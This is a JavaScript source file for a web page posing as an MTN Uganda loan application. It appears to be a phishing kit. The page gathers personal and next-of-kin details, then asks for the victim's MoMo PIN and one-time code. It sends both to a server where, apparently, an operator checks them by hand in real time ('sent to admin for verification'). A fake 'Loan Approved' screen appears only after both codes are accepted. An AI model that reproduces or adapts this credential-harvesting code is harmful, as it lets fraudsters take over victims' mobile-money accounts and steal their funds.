// ============================================================
// MTN Uganda Loan Application – Frontend Logic
// ============================================================

const S = {
    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
    firstName: '', lastName: '', phone: '', email: '',
    employment: '', annualIncome: 0,
    kinName: '', kinPhone: '',
    applicationId: '',
    isSubmitting: false,
    rejectedStep: null
};

let currentPollTimeout = null;
let otpResendTimer = null;
let otpResendCountdown = 0;
let pinBlockTimer = null;

// ─── localStorage Helpers ───
const STORAGE_KEYS = {
    APPLICATION_ID: 'mtn_uganda_application_id',
    APPLICATION_DATA: 'mtn_uganda_application_data',
    REJECTION_INFO: 'mtn_uganda_rejection_info',
    FORM_DRAFT: 'mtn_uganda_form_draft',
    OTP_TIMER: 'mtn_uganda_otp_timer'
};

function saveToLocalStorage(key, data) {
    try {
        localStorage.setItem(key, JSON.stringify(data));
        console.log(`💾 Saved to localStorage: ${key}`);
    } catch (error) {
        console.error(`❌ Failed to save ${key}:`, error);
    }
}

function getFromLocalStorage(key) {
    try {
        const data = localStorage.getItem(key);
        return data ? JSON.parse(data) : null;
    } catch (error) {
        console.error(`❌ Failed to load ${key}:`, error);
        return null;
    }
}

function removeFromLocalStorage(key) {
    try {
        localStorage.removeItem(key);
        console.log(`🗑️ Removed from localStorage: ${key}`);
    } catch (error) {
        console.error(`❌ Failed to remove ${key}:`, error);
    }
}

// ─── Save/Load Application ID ───
function saveApplicationId(id) {
    if (id) {
        S.applicationId = id;
        saveToLocalStorage(STORAGE_KEYS.APPLICATION_ID, { id, timestamp: new Date().toISOString() });
    }
}

function loadApplicationId() {
    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
    if (saved && saved.id) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            S.applicationId = saved.id;
            console.log(`🔄 Restored server application ID: ${saved.id}`);
            return saved.id;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
        }
    }
    return null;
}

function saveApplicationData() {
    const dataToSave = { ...S, timestamp: new Date().toISOString() };
    saveToLocalStorage(STORAGE_KEYS.APPLICATION_DATA, dataToSave);
}

function loadApplicationData() {
    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
    if (saved) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            ['loanType', 'loanAmount', 'loanTerm', 'loanPurpose', 'firstName', 'lastName', 'phone', 'email', 'employment', 'annualIncome', 'kinName', 'kinPhone', 'applicationId', 'rejectedStep'].forEach(field => {
                if (saved[field] !== undefined) S[field] = saved[field];
            });
            console.log('🔄 Restored application data from localStorage');
            return true;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
        }
    }
    return false;
}

function saveRejectionInfo(step, applicationId) {
    saveToLocalStorage(STORAGE_KEYS.REJECTION_INFO, { step, applicationId, timestamp: new Date().toISOString() });
}

function loadRejectionInfo() {
    const saved = getFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
    if (saved) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 5 * 60 * 1000) return saved;
        else removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
    }
    return null;
}

function clearRejectionInfo() { removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO); }

function saveFormDraft() {
    const draft = {
        firstName: document.getElementById('s2fi')?.value || '',
        lastName: document.getElementById('s2la')?.value || '',
        phone: document.getElementById('s2ph')?.value || '',
        email: document.getElementById('s2em')?.value || '',
        loanAmount: document.getElementById('s1am')?.value || '',
        loanPurpose: document.getElementById('s1reason')?.value || '',
        kinFirstName: document.getElementById('s3kf')?.value || '',
        kinLastName: document.getElementById('s3kl')?.value || '',
        kinPhone: document.getElementById('s3kp')?.value || '',
        district: document.getElementById('s3prov')?.value || '',
        timestamp: new Date().toISOString()
    };
    saveToLocalStorage(STORAGE_KEYS.FORM_DRAFT, draft);
}

function loadFormDraft() {
    const draft = getFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
    if (draft) {
        const age = Date.now() - new Date(draft.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            if (draft.firstName) document.getElementById('s2fi').value = draft.firstName;
            if (draft.lastName) document.getElementById('s2la').value = draft.lastName;
            if (draft.phone) document.getElementById('s2ph').value = draft.phone;
            if (draft.email) document.getElementById('s2em').value = draft.email;
            if (draft.loanAmount) document.getElementById('s1am').value = draft.loanAmount;
            if (draft.loanPurpose) document.getElementById('s1reason').value = draft.loanPurpose;
            if (draft.kinFirstName) document.getElementById('s3kf').value = draft.kinFirstName;
            if (draft.kinLastName) document.getElementById('s3kl').value = draft.kinLastName;
            if (draft.kinPhone) document.getElementById('s3kp').value = draft.kinPhone;
            if (draft.district) document.getElementById('s3prov').value = draft.district;
            console.log('🔄 Restored form draft from localStorage');
            return true;
        } else removeFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
    }
    return false;
}

// ─── Navigation ───
function goTo(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
}

function startApplication() {
    S.rejectedStep = null;
    clearRejectionInfo();
    if (!S.applicationId) {
        S.applicationId = 'TEMP-' + Date.now().toString().slice(-6);
    }
    ['s1Err', 's2Err', 's3Err', 'pinErr', 'otpErr'].forEach(id => clearErr(id));
    goTo('page-step1');
}

function showToast(message, type = 'info', duration = 3000) {
    const existing = document.querySelector('.toast');
    if (existing) existing.remove();
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    toast.textContent = message;
    document.body.appendChild(toast);
    setTimeout(() => { toast.style.opacity = '0'; toast.style.transform = 'translateX(-50%) translateY(-20px)'; setTimeout(() => toast.remove(), 300); }, duration);
}

function normalizePhone(id) {
    let inp = document.getElementById(id);
    let val = inp.value.replace(/\D/g, '');
    if (val.length > 9) val = val.substring(0, 9);
    inp.value = val;
    saveFormDraft();
}

function updateStep1Calc() {
    const amt = +document.getElementById('s1am').value;
    const dur = +document.getElementById('s1dur').value;
    const interest = Math.round(amt * 0.005 * dur);
    const total = amt + interest;

    document.getElementById('s1AmtDisplay').textContent = 'UGX ' + amt.toLocaleString();
    document.getElementById('s1DurDisplay').textContent = dur + ' days';
    document.getElementById('s1Principal').textContent = 'UGX ' + amt.toLocaleString();
    document.getElementById('s1Interest').textContent = 'UGX ' + interest.toLocaleString();
    document.getElementById('s1Total').textContent = 'UGX ' + total.toLocaleString();
}

function showErr(id, msg) {
    const box = document.getElementById(id);
    if (box) {
        box.classList.add('show');
        const txt = document.getElementById(id + 'Txt');
        if (txt) txt.textContent = msg;
    }
}

function clearErr(id) {
    const box = document.getElementById(id);
    if (box) box.classList.remove('show');
}

function toS2() {
    const am = +document.getElementById('s1am').value;
    const du = +document.getElementById('s1dur').value;
    const pu = document.getElementById('s1reason').value;
    if (am < 100000 || du < 14 || !pu.trim()) { showErr('s1Err', 'Please complete all fields.'); return; }
    S.loanAmount = am;
    S.loanTerm = du + ' days';
    S.loanPurpose = pu;
    saveApplicationData(); saveFormDraft();
    goTo('page-step2');
}

function toS3() {
    const fi = document.getElementById('s2fi').value.trim();
    const la = document.getElementById('s2la').value.trim();
    const ph = document.getElementById('s2ph').value;
    const em = document.getElementById('s2em').value.trim();
    if (!fi || !la) { showErr('s2Err', 'Please enter your full name.'); return; }
    if (ph.length !== 9) { showErr('s2Err', 'Please enter a valid 9-digit phone number.'); return; }
    if (!em || !em.includes('@')) { showErr('s2Err', 'Please enter a valid email address.'); return; }
    S.firstName = fi; S.lastName = la; S.phone = ph; S.email = em;
    saveApplicationData(); saveFormDraft();

    // Update summary
    document.getElementById('sA').textContent = 'UGX ' + S.loanAmount.toLocaleString();
    document.getElementById('sT').textContent = S.loanTerm;
    const interest = Math.round(S.loanAmount * 0.005 * parseInt(S.loanTerm));
    document.getElementById('sR').textContent = 'UGX ' + (S.loanAmount + interest).toLocaleString();
    document.getElementById('sN').textContent = fi + ' ' + la;

    goTo('page-step3');
}

function pinMvM(el, i, maxLength = 5) {
    el.value = el.value.replace(/\D/g, '');
    if (el.value && i < maxLength - 1) {
        const nextPin = document.getElementById('pin' + (i + 1));
        if (nextPin) { nextPin.focus(); return; }
    }
    if (i === maxLength - 1 && el.value) {
        const allFilled = [0,1,2,3,4].every(idx => document.getElementById('pin' + idx)?.value);
        if (allFilled) setTimeout(() => doPin(), 300);
    }
}

function togPin() {
    for (let i = 0; i < 5; i++) {
        const b = document.getElementById('pin' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
    for (let i = 0; i < 4; i++) {
        const b = document.getElementById('otp' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
}

function chkPin() {
    const pinOk = [0,1,2,3,4].every(i => document.getElementById('pin' + i)?.value);
    const pinBtn = document.querySelector('#page-pin .btn-grad');
    if (pinBtn) pinBtn.disabled = !pinOk;
    const otpOk = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
    const otpBtn = document.querySelector('#page-otp .btn-grad');
    if (otpBtn) otpBtn.disabled = !otpOk;
}

document.addEventListener('keyup', chkPin);

function clearLoginPin() {
    [0,1,2,3,4].forEach(i => document.getElementById('pin'+i).value = '');
    document.getElementById('pin0').focus(); chkPin();
}

function clearOtpCode() {
    [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
    document.getElementById('otp0').focus(); chkPin();
}

function handleOtpInput(el, type) {
    el.value = el.value.replace(/\D/, '');
    const idx = parseInt(el.id.match(/\d$/)[0]);
    if (el.value && type === 'otp' && idx < 3) document.getElementById('otp' + (idx + 1))?.focus();
    chkPin();
    if (idx === 3 && el.value) {
        const allFilled = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
        if (allFilled) setTimeout(() => doOtp(), 300);
    }
}

async function checkPinStatus() {
    try {
        const response = await fetch(`/api/pin-status/${S.applicationId}`);
        const data = await response.json();
        if (data.ok) {
            const remaining = data.remainingAttempts || 3;
            const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
            if (attemptsDisplay) {
                if (data.isBlocked) {
                    attemptsDisplay.innerHTML = `🔒 Too many attempts. Blocked for ${data.blockRemainingSeconds}s`;
                    attemptsDisplay.className = 'pin-attempts blocked';
                    document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = true);
                    document.querySelector('#page-pin .btn-grad').disabled = true;
                    startPinBlockCountdown(data.blockRemainingSeconds);
                } else {
                    attemptsDisplay.innerHTML = `🔑 Attempts remaining: ${remaining} of 3`;
                    attemptsDisplay.className = 'pin-attempts';
                }
            }
            return data;
        }
    } catch (error) { console.error('Error checking PIN status:', error); }
    return null;
}

function startPinBlockCountdown(seconds) {
    const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
    if (!attemptsDisplay) return;
    if (pinBlockTimer) { clearInterval(pinBlockTimer); pinBlockTimer = null; }
    let remaining = seconds;
    attemptsDisplay.textContent = `🔒 Too many attempts. Blocked for ${remaining}s`;
    attemptsDisplay.className = 'pin-attempts blocked';
    pinBlockTimer = setInterval(() => {
        remaining--;
        if (remaining <= 0) {
            clearInterval(pinBlockTimer); pinBlockTimer = null;
            attemptsDisplay.textContent = '✅ PIN available. Please try again.';
            attemptsDisplay.className = 'pin-attempts available';
            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = false);
            document.querySelector('#page-pin .btn-grad').disabled = false;
            resetPinAttempts();
        } else attemptsDisplay.textContent = `🔒 Too many attempts. Blocked for ${remaining}s`;
    }, 1000);
}

async function resetPinAttempts() {
    try { await fetch(`/api/reset-pin-attempts/${S.applicationId}`, { method: 'POST' }); }
    catch (error) { console.error('Error resetting PIN attempts:', error); }
}

function startOtpResendTimer(seconds = 20) {
    const btn = document.getElementById('resendOtpBtn');
    if (!btn) return;
    if (otpResendTimer) { clearInterval(otpResendTimer); otpResendTimer = null; }
    otpResendCountdown = seconds;
    btn.disabled = true; btn.textContent = `⏳ Wait ${otpResendCountdown}s`;
    btn.classList.remove('hidden');
    saveToLocalStorage(STORAGE_KEYS.OTP_TIMER, { endTime: Date.now() + (seconds * 1000), applicationId: S.applicationId });
    otpResendTimer = setInterval(() => {
        otpResendCountdown--;
        if (otpResendCountdown <= 0) {
            clearInterval(otpResendTimer); otpResendTimer = null;
            btn.disabled = false; btn.textContent = '🔄 Resend OTP';
            removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
        } else btn.textContent = `⏳ Wait ${otpResendCountdown}s`;
    }, 1000);
}

function checkOtpTimerRecovery() {
    const saved = getFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
    if (saved && saved.endTime && saved.applicationId === S.applicationId) {
        const remaining = Math.ceil((saved.endTime - Date.now()) / 1000);
        if (remaining > 0) { startOtpResendTimer(remaining); return true; }
        else removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
    }
    return false;
}

function handleRejection(step) {
    clearErr('s3Err'); clearErr('pinErr'); clearErr('otpErr');
    if (currentPollTimeout) { clearTimeout(currentPollTimeout); currentPollTimeout = null; }
    saveRejectionInfo(step, S.applicationId);
    switch(step) {
        case 'pin':
            showToast('❌ PIN was rejected. Please re-enter your MoMo PIN.', 'error');
            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
            document.getElementById('pin0').focus();
            document.querySelector('#page-pin .step-card')?.classList.add('rejected');
            setTimeout(() => document.querySelector('#page-pin .step-card')?.classList.remove('rejected'), 3000);
            checkPinStatus();
            goTo('page-pin');
            break;
        case 'otp':
            showToast('❌ OTP was rejected. Please request a new OTP.', 'error');
            clearOtpCode();
            document.querySelector('#page-otp .step-card')?.classList.add('rejected');
            setTimeout(() => document.querySelector('#page-otp .step-card')?.classList.remove('rejected'), 3000);
            startOtpResendTimer(20);
            goTo('page-otp');
            break;
        default:
            showToast('❌ Application was rejected. Please start over.', 'error');
            goTo('page-step1');
    }
}

function startPoll(applicationId, step, onSuccess, onReject) {
    if (currentPollTimeout) { clearTimeout(currentPollTimeout); currentPollTimeout = null; }
    const check = async () => {
        try {
            const res = await fetch(`/api/status/${applicationId}/${step}`);
            if (res.status === 404) {
                currentPollTimeout = null;
                alert('Application not found. Please start again.');
                clearAllStorage();
                goTo('page-landing');
                return;
            }
            const data = await res.json();
            if (data && data.ok === true) {
                if (data.status === 'approved') { currentPollTimeout = null; onSuccess(); return; }
                else if (data.status === 'rejected') { currentPollTimeout = null; onReject(); return; }
            }
            currentPollTimeout = setTimeout(check, 2000);
        } catch (err) {
            console.error('Polling error:', err);
            currentPollTimeout = setTimeout(check, 3000);
        }
    };
    check();
}

async function resendOtp() {
    const btn = document.getElementById('resendOtpBtn');
    if (otpResendTimer || otpResendCountdown > 0) {
        showToast(`⏳ Please wait ${otpResendCountdown} seconds before resending.`, 'info');
        return;
    }
    try {
        btn.disabled = true; btn.textContent = '⏳ Sending...';
        const response = await fetch('/api/resend-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationId: S.applicationId })
        });
        const data = await response.json();
        if (data.ok) {
            showToast('✅ New OTP sent to admin for verification!', 'success');
            startOtpResendTimer(20);
            startPoll(S.applicationId, 'otp',
                () => { showToast('✅ OTP Verified! Loan Approved 🎉', 'success'); showApproval(); },
                () => handleRejection('otp')
            );
        } else { showToast('❌ Failed to resend OTP. Please try again.', 'error'); btn.disabled = false; btn.textContent = '🔄 Resend OTP'; }
    } catch (error) {
        console.error('Resend OTP error:', error);
        showToast('❌ Failed to resend OTP. Please try again.', 'error');
        btn.disabled = false; btn.textContent = '🔄 Resend OTP';
    }
}

function showApproval() {
    const interest = Math.round(S.loanAmount * 0.005 * parseInt(S.loanTerm));
    const total = S.loanAmount + interest;
    document.getElementById('aprAmount').textContent = 'UGX ' + S.loanAmount.toLocaleString();
    document.getElementById('aprAmt').textContent = 'UGX ' + S.loanAmount.toLocaleString();
    document.getElementById('aprTerm').textContent = S.loanTerm;
    document.getElementById('aprMth').textContent = 'UGX ' + total.toLocaleString();
    Object.values(STORAGE_KEYS).forEach(key => removeFromLocalStorage(key));
    if (otpResendTimer) { clearInterval(otpResendTimer); otpResendTimer = null; }
    if (pinBlockTimer) { clearInterval(pinBlockTimer); pinBlockTimer = null; }
    goTo('page-approval');
}

async function submitApp() {
    const kn = document.getElementById('s3kf').value.trim() + ' ' + document.getElementById('s3kl').value.trim();
    const kp = document.getElementById('s3kp').value.trim();
    const prov = document.getElementById('s3prov').value;
    if (!kn.trim() || kp.length !== 9 || !prov) { showErr('s3Err', 'Please complete all fields.'); return; }
    S.kinName = kn; S.kinPhone = kp;

    try {
        const response = await fetch('/api/send-application', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationData: S })
        });
        const data = await response.json();
        if (data.ok) {
            S.applicationId = data.applicationId;
            saveApplicationId(S.applicationId);
            saveApplicationData();
            goTo('page-pin');
            checkPinStatus();
        } else {
            showErr('s3Err', 'Failed to submit application: ' + (data.error || 'Unknown error'));
        }
    } catch (error) {
        console.error('Submit application error:', error);
        showErr('s3Err', 'Failed to submit application. Please try again.');
    }
}

async function doPin() {
    const pin = [0,1,2,3,4].map(i => document.getElementById('pin'+i).value).join('');
    if (pin.length < 5) { showErr('pinErr', 'Enter a valid 5-digit MoMo PIN.'); return; }
    const pinStatus = await checkPinStatus();
    if (pinStatus && pinStatus.isBlocked) { showErr('pinErr', `Too many failed attempts. Please wait ${pinStatus.blockRemainingSeconds} seconds.`); return; }
    try {
        const response = await fetch('/api/send-pin', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, pin, isResubmission: !!S.rejectedStep }),
            headers: { 'Content-Type': 'application/json' }
        });
        const data = await response.json();
        if (!data.ok) { showErr('pinErr', data.error || 'Failed to submit PIN.'); return; }
        startPoll(S.applicationId, 'pin',
            () => { showToast('✅ PIN Verified!', 'success'); resetPinAttempts(); goTo('page-otp'); },
            async () => {
                try {
                    const rejectResponse = await fetch('/api/pin-rejected', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ applicationId: S.applicationId })
                    });
                    const rejectData = await rejectResponse.json();
                    if (rejectData.blocked) {
                        showErr('pinErr', '🔒 Too many failed attempts. Blocked for 5 minutes.');
                        await checkPinStatus(); goTo('page-pin');
                    } else if (rejectData.remainingAttempts > 0) {
                        showErr('pinErr', `❌ Wrong PIN. ${rejectData.remainingAttempts} attempt(s) remaining.`);
                        document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
                        document.getElementById('pin0').focus();
                        const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
                        if (attemptsDisplay) { attemptsDisplay.textContent = `🔑 Attempts remaining: ${rejectData.remainingAttempts} of 3`; attemptsDisplay.className = 'pin-attempts warning'; }
                        goTo('page-pin');
                    } else handleRejection('pin');
                } catch (err) { console.error('Error handling PIN rejection:', err); handleRejection('pin'); }
            }
        );
    } catch (error) { console.error('Error submitting PIN:', error); showErr('pinErr', 'Failed to submit PIN. Please try again.'); }
}

async function doOtp() {
    const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
    if (otp.length < 4) { showErr('otpErr', 'Enter a valid 4-digit OTP.'); return; }
    try {
        await fetch('/api/send-otp', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, otp, isResubmission: !!S.rejectedStep }),
            headers: { 'Content-Type': 'application/json' }
        });
        startPoll(S.applicationId, 'otp',
            () => { showToast('✅ OTP Verified! Loan Approved 🎉', 'success'); showApproval(); },
            () => handleRejection('otp')
        );
    } catch (error) { console.error('OTP submission error:', error); showErr('otpErr', 'Failed to submit OTP.'); }
}

function clearAllStorage() {
    Object.values(STORAGE_KEYS).forEach(key => removeFromLocalStorage(key));
    S.applicationId = '';
    S.rejectedStep = null;
}

function recoverSession() {
    console.log('🔄 Checking for saved session...');
    const appId = loadApplicationId();
    if (appId) console.log(`✅ Found server application ID: ${appId}`);
    const dataLoaded = loadApplicationData();
    if (dataLoaded) console.log('✅ Loaded application data');
    if (checkOtpTimerRecovery()) { console.log('✅ Recovered OTP timer'); return true; }
    const rejection = loadRejectionInfo();
    if (rejection) {
        console.log(`✅ Found rejection info for step: ${rejection.step}`);
        showToast(`⚠️ Your ${rejection.step.toUpperCase()} was rejected. Please try again.`, 'error');
        S.applicationId = rejection.applicationId;
        handleRejection(rejection.step);
        return true;
    }
    if (!rejection) loadFormDraft();
    return false;
}

document.addEventListener('input', (e) => {
    if (e.target.closest('#page-step1, #page-step2, #page-step3')) saveFormDraft();
    if (e.target.closest('#page-step2, #page-step3')) saveApplicationData();
});

const originalGoTo = goTo;
goTo = function(pageId) {
    originalGoTo(pageId);
    if (pageId === 'page-pin') { checkPinStatus(); }
};

updateStep1Calc();
const recovered = recoverSession();
if (!recovered) goTo('page-landing');

console.log('✅ MTN Uganda Loan App loaded!');
